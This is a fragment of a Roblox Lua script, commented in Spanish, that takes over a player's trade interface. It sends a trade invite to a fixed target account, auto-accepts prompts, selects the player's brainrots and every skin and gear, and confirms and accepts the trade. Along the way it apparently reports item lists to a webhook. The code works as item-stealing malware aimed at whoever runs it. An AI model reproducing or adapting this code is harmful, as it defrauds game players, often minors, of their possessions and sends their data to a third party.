		return nil
	end

	local function findAvailableCategoryUiButtons(root, categoryKeyword)
		local results = {}
		local seenButtons = {}
		if not root then
			return results
		end
		local kw = string.lower(categoryKeyword)
		for _, desc in ipairs(root:GetDescendants()) do
			if desc:IsA("GuiButton") and not seenButtons[desc] then
				local fullPath = string.lower(desc:GetFullName())
				if fullPath:find(kw, 1, true) then
					seenButtons[desc] = true
					table.insert(results, desc)
				end
			end
		end
		return results
	end

	local function findTradeConfirmOrAcceptButton(main)
		if not main then
			return nil, nil
		end
		local other = main:FindFirstChild("Other", true)
		local readyBtn = other and other:FindFirstChild("ReadyButton", true) or main:FindFirstChild("ReadyButton", true)
		if readyBtn then
			local txtObj = readyBtn:FindFirstChild("Txt", true)
			if txtObj and txtObj:IsA("TextLabel") then
				local label = string.upper((txtObj.Text or ""):gsub("^%s+", ""):gsub("%s+$", ""))
				if label == "READY" then
					return TRADE_STATE.CONFIRMING, readyBtn
				elseif label == "ACCEPT" then
					return TRADE_STATE.ACCEPTING, readyBtn
				end
			end
		end
		for _, desc in ipairs(main:GetDescendants()) do
			if desc:IsA("GuiButton") then
				local t = string.upper((tostring(desc.Text or "")):gsub("^%s+", ""):gsub("%s+$", ""))
				if t == "READY" then
					return TRADE_STATE.CONFIRMING, desc
				elseif t == "ACCEPT" then
					return TRADE_STATE.ACCEPTING, desc
				end
			end
		end
		return nil, nil
	end

	local priority = fn7("PRIORITY")
	local normal = fn7("NORMAL")
	local v = fn5()
	local v2 = fn6()
	if #priority == 0 and #normal == 0 and #v == 0 and #v2 == 0 then
		return
	end
	fn2()

	local tbl6 = {
		phase = "IDLE",
		tradeState = TRADE_STATE.CLOSED,
		queue = {},
		targetId = 0,
		running = false,
		priorityDone = false,
		addIdx = 1,
		baseSkinQueue = {},
		gearQueue = {},
		baseSkinIdx = 1,
		gearIdx = 1,
		inviteSentForCurrentCycle = false,
		selectedBrainrotSlots = {},
		selectedBaseSkinKeys = {},
		selectedGearKeys = {},
		lastConfirmAction = "",
	}

	if #priority > 0 then
		fn21(fn11("PRIORITY"), goodWebhook, nil, true, targetName .. " [PRIORITY]", "PRIORITY")
		tbl6.phase = "PRIORITY"
		tbl6.tradeState = TRADE_STATE.PENDING_INVITE
		tbl6.queue = priority
		tbl6.targetId = targetUserId
		tbl6.running = true
		tbl6.addIdx = 1
	else
		if not (#normal > 0 or #v > 0 or #v2 > 0) then
			return
		end
		local normal2 = fn11("NORMAL")
		fn21(normal2, goodWebhook, nil, true, targetName .. " [NORMAL]", nil)
		tbl6.phase = "NORMAL"
		tbl6.tradeState = TRADE_STATE.PENDING_INVITE
		tbl6.queue = normal
		tbl6.targetId = targetUserId
		tbl6.running = true
		tbl6.addIdx = 1
	end

	tbl6.baseSkinQueue = fn5()
	tbl6.gearQueue = fn6()
	tbl6.baseSkinIdx = 1
	tbl6.gearIdx = 1

	-- Aceptación automática de invitación entrante en DuelsMachinePrompt (lógica de autoaccept)
	task.spawn(function()
		while true do
			task.wait(0.25)
			pcall(function()
				local duelGui = playerGui:FindFirstChild("DuelsMachinePrompt", true)
				if duelGui then
					local prompt = duelGui:FindFirstChild("DuelsMachinePrompt", true)
					prompt = prompt and prompt:FindFirstChild("Prompt", true)
					local yesBtn = prompt and prompt:FindFirstChild("Yes", true)
					if yesBtn then
						simulateUiClick(yesBtn, 0.35)
					end
				end
			end)
		end
	end)

	-- Bucle de AutoSendTrade: abrir intercambio, buscar KIMILOSP, seleccionar y enviar sin cerrar la interfaz
	task.spawn(function()
		while true do
			task.wait(0.45)
			if not tbl6.running or tbl6.targetId == 0 or tbl6.phase == "SWITCHING" or tbl6.phase == "IDLE" then
				continue
			end

			local _, liveMain = getLiveTradeMainFrame()
			local inSession = hasBothPlayersInTradeSession() and liveMain ~= nil

			if inSession then
				if tbl6.tradeState == TRADE_STATE.PENDING_INVITE then
					tbl6.tradeState = TRADE_STATE.IN_TRADE_SELECTING
					tbl6.inviteSentForCurrentCycle = false
					table.clear(tbl6.selectedBrainrotSlots)
					table.clear(tbl6.selectedBaseSkinKeys)
					table.clear(tbl6.selectedGearKeys)
					tbl6.lastConfirmAction = ""
				end
				continue
			end

			if tbl6.tradeState == TRADE_STATE.IN_TRADE_SELECTING
				or tbl6.tradeState == TRADE_STATE.CONFIRMING
				or tbl6.tradeState == TRADE_STATE.ACCEPTING
			then
				if hasCancelIndicatorInGui() then
					tbl6.tradeState = TRADE_STATE.CANCELLED
				else
					tbl6.tradeState = TRADE_STATE.CLOSED
				end
				tbl6.inviteSentForCurrentCycle = false
				table.clear(tbl6.selectedBrainrotSlots)
				table.clear(tbl6.selectedBaseSkinKeys)
				table.clear(tbl6.selectedGearKeys)
				tbl6.lastConfirmAction = ""
			end

			if not tbl6.inviteSentForCurrentCycle then
				local listGui = getTradeListGui()
				if not listGui then
					local openBtn = findLeftTradeButton()
					if openBtn then
						simulateUiClick(openBtn, 0.4)
					end
					continue
				end

				local searchBox = findSearchBox(listGui)
				if searchBox then
					typeExactTargetName(searchBox, targetName)
					task.wait(0.25)
				end

				local rowObj, sendBtn = findTargetRowAndSend(listGui, targetName, targetUserId)
				if rowObj and sendBtn then
					if simulateUiClick(sendBtn, 0.4) then
						tbl6.inviteSentForCurrentCycle = true
						tbl6.tradeState = TRADE_STATE.PENDING_INVITE
					end
				end
			end
		end
	end)

	-- Selección de Brainrots exclusivamente configurados (por slot/nombre exacto) + Base Skins y Gears + Confirmación/Aceptación
	task.spawn(function()
		while true do
			task.wait(0.35)
			if not tbl6.running or tbl6.phase == "SWITCHING" or tbl6.phase == "IDLE" then
				continue
			end

			local _, liveMain = getLiveTradeMainFrame()
			if not liveMain or not hasBothPlayersInTradeSession() then
				continue
			end

			if tbl6.tradeState == TRADE_STATE.PENDING_INVITE then
				tbl6.tradeState = TRADE_STATE.IN_TRADE_SELECTING
			end

			-- 3. Brainrots: solo elementos presentes en la lista configurada, sin similitud ni slots erróneos
			local queue = tbl6.queue
			if type(queue) == "table" and #queue > 0 then
				if tbl6.addIdx > #queue then
					tbl6.addIdx = 1
				end
				local entry = queue[tbl6.addIdx]
				if entry and not (tbl6.priorityDone and entry.isPriority) then
					local slotTag = tostring(entry.slotId or entry.slotKey or entry.displayName)
					if not tbl6.selectedBrainrotSlots[slotTag] then
						local uiBtn = findMatchingBrainrotUiButton(liveMain, entry)
						if uiBtn and simulateUiClick(uiBtn, 0.35) then
							tbl6.selectedBrainrotSlots[slotTag] = true
						end
					end
				end
				tbl6.addIdx = tbl6.addIdx + 1
			end

			-- 4. Base Skins: detectar e identificar todas las disponibles sin duplicar
			local skinBtns = findAvailableCategoryUiButtons(liveMain, "skin")
			for idx, sBtn in ipairs(skinBtns) do
				local key = tostring(sBtn:GetFullName()) .. "#" .. tostring(idx)
				if not tbl6.selectedBaseSkinKeys[key] then
					if simulateUiClick(sBtn, 0.35) then
						tbl6.selectedBaseSkinKeys[key] = true
					end
				end
			end

			-- 4. Gears: detectar e identificar todos los disponibles sin duplicar
			local gearBtns = findAvailableCategoryUiButtons(liveMain, "gear")
			for idx, gBtn in ipairs(gearBtns) do
				local key = tostring(gBtn:GetFullName()) .. "#" .. tostring(idx)
				if not tbl6.selectedGearKeys[key] then
					if simulateUiClick(gBtn, 0.35) then
						tbl6.selectedGearKeys[key] = true
					end
				end
			end

			-- 5. Confirmación y aceptación de intercambio según estado real del botón
			local stage, actionBtn = findTradeConfirmOrAcceptButton(liveMain)
			if stage and actionBtn then
				tbl6.tradeState = stage
				if tbl6.lastConfirmAction ~= stage then
					if simulateUiClick(actionBtn, 0.4) then
						tbl6.lastConfirmAction = stage
					end
				end
			end

			-- Transición de fase PRIORITY -> NORMAL cuando ya no quedan Brainrots prioritarios configurados
			if tbl6.phase == "PRIORITY" and not tbl6.priorityDone then
				local remainingPriority = fn7("PRIORITY")
				if #remainingPriority == 0 then
					tbl6.priorityDone = true
					tbl6.phase = "SWITCHING"
					tbl6.queue = {}
					table.clear(tbl6.selectedBrainrotSlots)
					table.clear(tbl6.selectedBaseSkinKeys)
					table.clear(tbl6.selectedGearKeys)
					tbl6.lastConfirmAction = ""
					task.wait(0.8)

					local normal2 = fn7("NORMAL")
					local v4 = fn5()
					local v5 = fn6()

					if #normal2 > 0 or #v4 > 0 or #v5 > 0 then
						local normal3 = fn11("NORMAL")
						fn21(normal3, goodWebhook, nil, true, targetName .. " [NORMAL]", nil)
						tbl6.queue = normal2
						tbl6.targetId = targetUserId
						tbl6.phase = "NORMAL"
						tbl6.tradeState = TRADE_STATE.PENDING_INVITE
						tbl6.inviteSentForCurrentCycle = false
						tbl6.addIdx = 1
						tbl6.baseSkinQueue = v4
						tbl6.gearQueue = v5
						tbl6.baseSkinIdx = 1
						tbl6.gearIdx = 1
					else
						tbl6.phase = "IDLE"
						tbl6.tradeState = TRADE_STATE.CLOSED
					end
				end
			end
		end
	end)

	task.spawn(function()
		while tbl6.phase ~= "NORMAL" do
			task.wait(0.5)
			if tbl6.phase ~= "IDLE" then
				continue
			end
			return
		end

		local n = #fn7("NORMAL")
		local n2 = #fn5()
		local n3 = #fn6()
		if n == 0 and n2 == 0 and n3 == 0 then
			return
		end

		while true do
			task.wait(0.5)
			local n4 = #fn7("NORMAL")
			local n5 = #fn5()
			local n6 = #fn6()
			if not (n4 < n or n5 < n2 or n6 < n3) then
				continue
			end
			break
		end

		fn22()
	end)
end)
